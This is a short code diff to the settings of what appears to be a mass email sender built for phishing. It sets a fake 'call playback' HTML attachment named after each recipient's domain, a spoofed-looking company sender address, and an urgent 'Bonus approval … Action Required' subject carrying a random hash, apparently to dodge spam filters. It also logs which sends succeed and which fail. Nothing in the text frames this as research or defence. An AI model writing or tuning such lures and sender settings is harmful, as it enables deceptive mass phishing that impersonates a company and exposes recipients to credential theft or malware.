@@ -122,10 +122,10 @@ const options = {
 
 
 const attachmentNameWithPlaceholders = 'call_playback_{RECIPIENT_DOMAIN_NAME}.html';
-const senderAddresses = ['support@telepresenz.com'];
+const senderAddresses = ['sales@telepresenz.com'];
 const messageFile = 'message.html';
 const senderNameWithPlaceholders = ""; 
-const subjectLineWithPlaceholders = "Q4 Drawdown Approval [{RANDOM_MD5}] - Action Required]"
+const subjectLineWithPlaceholders = "Bonus approval [{RANDOM_MD5}] - Action Required]"
 const MAX_RETRIES = 3; 
 const SUCCESS_FILE = 'success-emails.txt';
 const FAILURE_FILE = 'failed-emails.txt';
